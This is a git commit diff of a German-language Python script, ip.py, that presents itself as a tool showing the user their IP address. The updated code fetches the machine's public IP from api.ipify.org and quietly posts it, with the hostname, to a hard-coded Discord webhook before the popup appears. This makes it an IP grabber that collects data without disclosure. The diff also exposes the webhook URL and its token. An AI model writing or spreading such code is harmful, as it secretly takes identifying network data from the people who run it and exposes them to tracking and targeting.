56dbe38678a4317ad3d7f7f87e4c5fca017a10ff
AnneB235 <95297195+AnneB235@users.noreply.github.com>
2025-06-13 14:13:20 +0200

    Update ip.py

--- ip.py
+++ ip.py
@@ -1,24 +1,29 @@
-import socket
 import requests
+import socket
 from tkinter import messagebox, Tk
 
-# IP-Adresse ermitteln
+# Hostname für Discord-Username
 hostname = socket.gethostname()
-local_ip = socket.gethostbyname(hostname)
 
-# Popup anzeigen
-root = Tk()
-root.withdraw()
-messagebox.showinfo("IP-Adresse", f"Deine IP ist: {local_ip}")
+# Öffentliche IP holen
+try:
+    wan_ip = requests.get("https://api.ipify.org").text
+except:
+    wan_ip = "Unbekannt"
 
 # An Discord senden
 webhook_url = "https://discord.com/api/webhooks/1383009673388757035/u3gHQ_PHaJqBVojDoCbDxYwKrpIXGuT7rPurWnGJg2Tz8NQXoAU6_XqDhjHEyN63W_KE"
 payload = {
     "username": hostname,
-    "content": f"Lokale IP: {local_ip}"
+    "content": f"Öffentliche IP: {wan_ip}"
 }
 
 try:
     requests.post(webhook_url, json=payload)
 except Exception as e:
     print(f"Fehler beim Senden an Discord: {e}")
+
+# Jetzt Popup anzeigen
+root = Tk()
+root.withdraw()
+messagebox.showinfo("IP-Adresse", f"Öffentliche IP: {wan_ip}")
